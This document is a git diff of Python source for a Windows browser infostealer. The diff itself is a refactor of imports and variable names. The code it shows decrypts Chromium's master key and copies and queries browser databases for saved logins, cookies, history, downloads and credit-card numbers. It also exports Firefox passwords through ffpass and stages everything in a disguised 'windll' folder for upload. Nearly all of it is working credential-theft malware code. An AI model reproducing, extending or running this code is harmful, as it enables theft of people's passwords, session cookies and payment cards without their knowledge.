@@ -14,15 +14,14 @@
 """
 All imports
 """
-import base64
-import json
-import os
-import shutil
-import sqlite3
+from base64 import b64decode
+from json import loads
+from os import environ,sep,makedirs,getenv,path,remove
+from shutil import copy2,copy
+from sqlite3 import connect
 import ffpass
-import configparser
-import subprocess
-import win32crypt
+from configparser import ConfigParser
+from subprocess import Popen,PIPE
 from datetime import datetime, timedelta
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
@@ -70,8 +69,8 @@ class Upload:
     def write_files(self):
         self.Colected = False
         global browsersCounter
-        pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-        os.makedirs(rf'{pathf}\windll\Browsers\{names[browsersCounter]}', exist_ok=True)
+        pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
+        makedirs(rf'{pathf}\windll\Browsers\{names[browsersCounter]}', exist_ok=True)
         print(names[browsersCounter])
         if logins:
             if not self.Colected:
@@ -127,17 +126,17 @@ class FireFox:
 
     def Firefox(self):
         try:
-            path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-            os.makedirs(rf'{path}\windll\Browsers\Firefox', exist_ok=True)
-            mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
-            mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
-            profile = configparser.ConfigParser()
+            pathl = environ['USERPROFILE'] + sep + r'AppData\Local'
+            makedirs(rf'{pathl}\windll\Browsers\Firefox', exist_ok=True)
+            mozilla_profile = path.join(getenv('APPDATA'), r'Mozilla\Firefox')
+            mozilla_profile_ini = path.join(mozilla_profile, r'profiles.ini')
+            profile = ConfigParser()
             profile.read(mozilla_profile_ini)
-            data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
-            subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
+            data_path = path.normpath(path.join(mozilla_profile, profile.get('Profile0', 'Path')))
+            subprocesss = Popen("ffpass export -d  " + data_path, shell=True, stdout=PIPE)
             subprocess_return = subprocesss.stdout.read()
             passwords = str(subprocess_return)
-            with open(rf'{path}\windll\Browsers\Firefox\firefox.txt', "a", encoding="utf-8") as file:
+            with open(rf'{pathl}\windll\Browsers\Firefox\firefox.txt', "a", encoding="utf-8") as file:
                 file.write(passwords.replace('\\r', '\n'))
                 file.close()
         except Exception as e:
@@ -151,8 +150,8 @@ class Chromium:
         global downloads
         global cards
 
-        self.appdata = os.getenv('LOCALAPPDATA')
-        self.roaming = os.getenv('APPDATA')
+        self.appdata = getenv('LOCALAPPDATA')
+        self.roaming = getenv('APPDATA')
         self.browsers = {
             'amigo': self.appdata + '\\Amigo\\User Data',
             'torch': self.appdata + '\\Torch\\User Data',
@@ -183,7 +182,7 @@ class Chromium:
         ] 
         global browsersCounter
 
-        for _, path in self.browsers.items():
+        for _, pathl in self.browsers.items():
             browsersCounter+=1
             logins = ''''''
             cookies = ''''''
@@ -191,15 +190,15 @@ class Chromium:
             downloads = []
             cards = []
 
-            if not os.path.exists(path):
+            if not path.exists(pathl):
                 continue
 
-            self.master_key = self.get_master_key_chromium(path)
+            self.master_key = self.get_master_key_chromium(pathl)
             if not self.master_key:
                 continue
             
             for profile in self.profiles:
-                if not os.path.exists(path + '\\' + profile):
+                if not path.exists(pathl + '\\' + profile):
                     continue
                 
                 operations = [
@@ -212,21 +211,21 @@ class Chromium:
 
                 for operation in operations:
                     try:
-                        operation(path, profile)
+                        operation(pathl, profile)
                     except Exception as e:
                         pass
             Upload()
 
-    def get_login_data(self, path: str, profile: str):
+    def get_login_data(self, pathl: str, profile: str):
         try:
             global logins
-            master_key = self.get_master_key_chromium(path)
-            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
-                login_db = f'{path}\\{profile}\\Login Data'
+            master_key = self.get_master_key_chromium(pathl)
+            if pathl != "\\Opera Software\\Opera GX Stable" or pathl != "\\Opera Software\\Opera Stable":
+                login_db = f'{pathl}\\{profile}\\Login Data'
             else:
-                login_db = f'{path}\\Login Data'
-            shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
-            conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
+                login_db = f'{pathl}\\Login Data'
+            copy2(login_db, environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
+            conn = connect(environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
             cursor = conn.cursor()
 
         
@@ -241,7 +240,7 @@ class Chromium:
                 logins += f"\n\n\n{profile}:\n\n"
                 logins += alldatapass
             try:
-                os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
+                remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
             except:
                 pass
         except:
@@ -271,19 +270,19 @@ class Chromium:
         except:
             pass
 
-    def get_cookies(self, path: str, profile: str):
+    def get_cookies(self, pathl: str, profile: str):
         try:
             global cookies
             CookiesSQL = "SELECT * FROM cookies"
-            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
-                data_path = fr'{path}\{profile}\Network'
+            if pathl != "\\Opera Software\\Opera GX Stable" or pathl != "\\Opera Software\\Opera Stable":
+                data_path = fr'{pathl}\{profile}\Network'
             else:
-                data_path = fr'{path}\Network'
+                data_path = fr'{pathl}\Network'
             #files = os.listdir(data_path)
-            history_db = os.path.join(data_path, 'Cookies')
-            shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# find and copy cookies
+            history_db = path.join(data_path, 'Cookies')
+            copy2(history_db, environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# find and copy cookies
             #shutil.copy2(history_db, os.environ['USERPROFILE'] + 'C:\\windll\\Browsers\\Chrome\\cookies.db')
-            c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
+            c = connect(environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
             cursor = c.cursor()
         
         
@@ -322,24 +321,24 @@ class Chromium:
             cookies += f"\n\n\n{profile}:\n\n"
             cookies += results
             try:
-                os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# clear all
+                remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# clear all
             except:
                 pass
         except:
             pass
     
 
-    def get_master_key_chromium(self,path: str):
+    def get_master_key_chromium(self,pathl: str):
         try:
             try:
-                with open(rf'{path}\Local State', "r", encoding='utf-8') as f:
+                with open(rf'{pathl}\Local State', "r", encoding='utf-8') as f:
                     local_state = f.read()
-                    local_state = json.loads(local_state)
+                    local_state = loads(local_state)
             except:
                 local_state = ''
-            master_key_chrome = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key_chrome = b64decode(local_state["os_crypt"]["encrypted_key"])
             master_key_chrome = master_key_chrome[5:]  
-            master_key_chrome = win32crypt.CryptUnprotectData(master_key_chrome, None, None, None, 0)[1]
+            master_key_chrome = CryptUnprotectData(master_key_chrome, None, None, None, 0)[1]
             return master_key_chrome
         except Exception as e:
             print("get_master_key_chromium: "+e)
@@ -351,19 +350,19 @@ class Chromium:
         except:
             return "Can't decode"
 
-    def get_web_history(self, path: str, profile: str):
+    def get_web_history(self, pathl: str, profile: str):
         try:
             history.append(f"\n\n\n{profile}:\n\n")
             HistorySQL = "SELECT url FROM visits"
             HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
-            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
-                data_path = f'{path}\{profile}'
+            if pathl != "\\Opera Software\\Opera GX Stable" or pathl != "\\Opera Software\\Opera Stable":
+                data_path = f'{pathl}\{profile}'
             else:
-                data_path = f'{path}'
+                data_path = f'{pathl}'
             #files = os.listdir(data_path)
-            history_db = os.path.join(data_path, 'history')
-            shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')# find and copy history
-            c = sqlite3.connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
+            history_db = path.join(data_path, 'history')
+            copy2(history_db, environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')# find and copy history
+            c = connect(environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
             cursor = c.cursor()
             for result in cursor.execute(HistorySQL).fetchall():
                 data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
@@ -372,7 +371,7 @@ class Chromium:
                     continue
                 history.append(result)
             try:
-                os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')# clear all
+                remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')# clear all
             except:
                 pass
         except:
@@ -385,17 +384,17 @@ class Chromium:
         except:
             return "Can't decode"
 
-    def get_downloads(self, path: str, profile: str):
+    def get_downloads(self, pathl: str, profile: str):
         try:
-            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
-                downloads_db = f'{path}\\{profile}\\History'
+            if pathl != "\\Opera Software\\Opera GX Stable" or pathl != "\\Opera Software\\Opera Stable":
+                downloads_db = f'{pathl}\\{profile}\\History'
             else:
-                downloads_db = f'{path}\\History'
-            if not os.path.exists(downloads_db):
+                downloads_db = f'{pathl}\\History'
+            if not path.exists(downloads_db):
                 return
 
-            shutil.copy(downloads_db, 'downloads_db')
-            conn = sqlite3.connect('downloads_db')
+            copy(downloads_db, 'downloads_db')
+            conn = connect('downloads_db')
             cursor = conn.cursor()
             cursor.execute('SELECT tab_url, target_path FROM downloads')
             for row in cursor.fetchall():
@@ -405,21 +404,21 @@ class Chromium:
                 downloads.append(Types.Download(row[0], row[1]))
 
             conn.close()
-            os.remove('downloads_db')
+            remove('downloads_db')
         except:
             pass
 
-    def get_credit_cards(self, path: str, profile: str):
+    def get_credit_cards(self, pathl: str, profile: str):
         try:
-            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
-                cards_db = f'{path}\\{profile}\\Web Data'
+            if pathl != "\\Opera Software\\Opera GX Stable" or pathl != "\\Opera Software\\Opera Stable":
+                cards_db = f'{pathl}\\{profile}\\Web Data'
             else:
-                cards_db = f'{path}\\Web Data'
-            if not os.path.exists(cards_db):
+                cards_db = f'{pathl}\\Web Data'
+            if not path.exists(cards_db):
                 return
 
-            shutil.copy(cards_db, 'cards_db')
-            conn = sqlite3.connect('cards_db')
+            copy(cards_db, 'cards_db')
+            conn = connect('cards_db')
             cursor = conn.cursor()
             cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
             for row in cursor.fetchall():
@@ -430,7 +429,7 @@ class Chromium:
                 cards.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))
 
             conn.close()
-            os.remove('cards_db')
+            remove('cards_db')
         except:
             pass
 
